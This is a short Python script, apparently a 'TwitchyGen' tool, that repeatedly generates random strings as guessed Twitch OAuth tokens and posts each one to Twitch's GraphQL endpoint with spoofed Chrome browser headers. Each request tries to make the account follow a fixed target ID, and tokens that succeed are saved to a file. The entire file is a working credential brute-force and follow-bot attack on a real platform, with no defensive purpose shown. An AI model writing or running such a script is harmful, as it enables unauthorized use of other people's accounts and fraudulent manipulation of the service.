import random
import string
import os
import os
import random
import requests
import threading
from colorama import Fore

tokenamount = 0

for i in range(999999):
 os.system(f'title TwitchyGen ^| {tokenamount}')
 token = ''.join(random.choice(string.digits + string.ascii_lowercase) for _ in range(31))
 tokenamount += 1
 print(token)
 headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-GB",
            "Authorization": f"OAuth {token}",
            "Client-Id": "kimne78kx3ncx6brgo4mv6wki5h1ko",
            "Connection": "keep-alive",
            "Content-Length": "541",
            "Content-Type": "text/plain;charset=UTF-8",
            "Host": "gql.twitch.tv",
            "Origin": "https://www.twitch.tv",
            "Referer": "https://www.twitch.tv/",
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            }

 data = '[{"operationName":"FollowButton_FollowUser","variables":{"input":{"disableNotifications":false,"targetID":"532605746"}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"800e7346bdf7e5278a3c1d3f21b2b56e2639928f86815677a7126b093b2fdd08"}}}]'
 r = requests.post('https://gql.twitch.tv/gql', headers=headers, data=data)

 if "followUser" in r.text:
            open("working.txt", "a").write(f'{token}\n')
 else:
            open("tokens.txt", "a").write(f'{token}\n')
